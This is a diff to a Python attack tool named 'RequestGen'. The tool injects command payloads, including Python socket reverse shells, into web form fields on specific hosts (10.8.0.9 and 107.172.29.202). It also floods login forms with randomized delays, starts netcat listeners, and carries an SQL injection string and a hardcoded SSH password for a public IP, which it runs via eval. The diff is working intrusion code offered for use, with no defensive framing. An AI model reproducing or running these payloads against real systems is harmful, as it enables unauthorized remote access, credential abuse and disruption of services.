@@ -5,6 +5,7 @@ import requests
 import json
 import webbrowser
 import urllib.parse
+import subprocess
 
 def clear():
         if name == 'nt':
@@ -18,8 +19,56 @@ def menu_maker(menu):
             print('[{}]'.format(counter),menu[counter])
             counter = counter + 1
 
+def run_command():
+    clear()
+    global port_number, menu
+    menu = ['Reverse Shell Listener', 'SSH Login']
+    menu_maker(menu)
+    option1 = input("\n    Choice:  ")
+    clear()
+    
+    command_dictionary ={
+        '0':"subprocess.run(['nc','-nlvp',port_number])",
+        '1':"subprocess.run(['sshpass','-p','SuPeRSeCrEt','ssh','ez@107.172.29.202'])",
+    }
+
+    if option1 == '0':
+        port_number = input('\nEnter listener PORT:  ')
+
+    eval(command_dictionary[option1])
+
 # Holds content to build various POST requests
 class Request_Builder():
+
+    def Remote_System_Admin(self):
+        global url, header, body, shell_command
+        url = 'http://10.8.0.9:8080'
+        header = {
+            "Host": "10.8.0.9:8080",
+            "Content-Length": "43",
+            "Cache-Control":"max-age=0",
+            "Upgrade-Insecure-Requests": "1",
+            "Origin": "http://10.8.0.9:8080",
+            "Content-Type": "application/x-www-form-urlencoded",
+            "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
+            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+            "Referer":"http://10.8.0.9:8080/index.php",
+            "Accept-Encoding":"gzip, deflate",
+            "Accept-Language":"en-US,en;q=0.9",
+            "Connection": "close",
+        }
+        body = {
+            # "ip":"",
+            # "submit":"submit",
+            "uname":"user",
+            "psw":"password",
+            "btnLogin":"Login"
+        }
+        form_url = '/index.php?uname={}&psw={}&btnLogin={}'
+        body['psw'] = shell_command
+        # url = url + form_url.format(body["uname"],body['psw'],body["btnLogin"])
+
+
 
     def EzsAdmin(self):
         global url, header, body, shell_command
@@ -42,8 +91,11 @@ class Request_Builder():
         admin_name = ''
         admin_id = ''
         filename = ''
+        filename = shell_command
         form_url = '/console/view.php?AdminName={}&AdminID={}&filename={}&submit=Submit+Query'
-        url = url + form_url.format(admin_name,admin_id,shell_command)
+        url = url + form_url.format(admin_name,admin_id,filename)
+
+
 
     def phishing_counter(self):
         global url, header, body
@@ -84,13 +136,13 @@ class Login_Builder():
 
 
     def payload_builder(self):
-        global count, email_list, password_list, payload_list
+        global count, email_list, password_list, payload_list, delay, min_sleep, max_sleep
 
         choice = input("\nDelay between sending logins?   (y/n):  ")
         if choice == 'y':
-            self.delay = True
-            self.min_sleep = int(input("\nMinimum time to wait (seconds):  "))
-            self.max_sleep = int(input("Maximum time to wait (seconds):  "))
+            delay = True
+            min_sleep = int(input("\nMinimum time to wait (seconds):  "))
+            max_sleep = int(input("Maximum time to wait (seconds):  "))
         print("\nBuilding Attack Lists....\n")
         count = int(input("\nHow many requests should I send?   "))
 
@@ -118,19 +170,22 @@ Construct_Login = Login_Builder()
 class Request_Sender():
     def post_request_sender(self):
         self.delay = False
-        global count, url, header, body
-        for i in range(count):  
+        global count, url, header, body, payload_list, min_sleep, max_sleep
+
+        for i in range(count):
+            if payload_list:
+                body = payload_list[i]
             r = requests.post(url=url, headers=header ,data=json.dumps(body))
-            # print(url)
-            # requests.post(self.url, data=json.dumps(self.payload_list[i]), headers=self.headers)
+
+            print("\n\n",r,"\n\n",url,"\n\n",body,"\n\n",r.content)
+
+            # Check if counter for multiple requests is set
             if count > 1:
                 print("\nLogin ", i)
-                print("Username: ", payload_list[i]['u'])
-                print("Password: ", payload_list[i]['p'])
-
-            if self.delay == True:
-                sleep(random.randint(self.min_sleep,self.max_sleep))
-            #print(r.content)
+                # print(body)
+                if delay == True:
+                    sleep(random.randint(min_sleep,max_sleep))
+            
             webbrowser.open(url, new=0, autoraise=True)
 Construct_Request = Request_Sender()
 
@@ -160,28 +215,28 @@ class Payloads():
                 "1":";export RHOST='{}';export RPORT={};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv('RHOST'),int(os.getenv('RPORT'))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn('/bin/sh')'",
                 "2":";python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(({},{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn('/bin/bash')'"
             },
-            # Reverse shell listeners
+            # Python file server
             "3":{
-                "1":"nc -lvp {}",
-                "2":"nc -u -lvp {}",
-            },
-            # Python file server syntax
-            "4":{
                 "1":";python3 -m http.server 8083",
                 "2":";python3 -m SimpleHTTPServer 8083",
             },
+            # SQL Injection
+            "4":{
+                "1":"'or'1=1"
+            }
         }
 
     def ip_port(self):
+        clear()
         global shell_command, ip_address, port_number
         ip_address = input('\nEnter listener IP:  ')
         port_number = input('Enter listener PORT:  ')
 
     def command_constructor(self):
         global shell_command, ip_address, port_number, body
-
+        clear()
         # Build options menu with a list and while loop to print it's contents
-        menu = ['Bash','Netcat','Python','Listeners','File Server']
+        menu = ['Bash','Netcat','Python','File Server','SQL Injection']
         menu_maker(menu)
         option1 = input("\n    Choice:  ")
         clear()
@@ -191,7 +246,8 @@ class Payloads():
             print ('    [{}]'.format(key), value.format(ip_address, port_number))
 
         option2 = input('\n    Choice:  ')
-        shell_command = urllib.parse.quote(self.command_dictionary[option1][option2].format(ip_address, port_number))
+        # shell_command = urllib.parse.quote(self.command_dictionary[option1][option2].format(ip_address, port_number))
+        shell_command = self.command_dictionary[option1][option2].format(ip_address, port_number)
 Construct_Payload = Payloads()
 
 # Runs on script execution. Calls the other classes and functions accordingly.
@@ -202,19 +258,26 @@ class Main_App():
         count = 1
         print("   **********************\n         RequestGen\n   **********************\n")
 
-        menu = ['Spam a request','SQL Injection','Command Injection',]
+        menu = ['Login Flooder',"Remote System Admin (10.8.0.9)", "EZ's Admin Command (107.172.29.202)", "Other Commands"]
         menu_maker(menu)
-        program = input("\n    Choice:  ")
+        choice = input("\n    Choice:  ")
 
-        if program == '1':
-            Construct_Login.payload_builder()
+        if choice == '0':
             Construct_Header.phishing_counter()
-        if program =='2':
-            Construct_Header.EzsAdmin()
-        if program =='3':
+            Construct_Login.payload_builder()
+
+        elif choice =='1':
+            Construct_Payload.ip_port()
+            Construct_Payload.command_constructor()
+            Construct_Header.Remote_System_Admin()
+            
+        elif choice =='2':
             Construct_Payload.ip_port()
             Construct_Payload.command_constructor()
             Construct_Header.EzsAdmin()
 
-        Construct_Request.post_request_sender()
+        elif choice =='3':
+            run_command()
+
+        # Construct_Request.post_request_sender()
 Main_App()
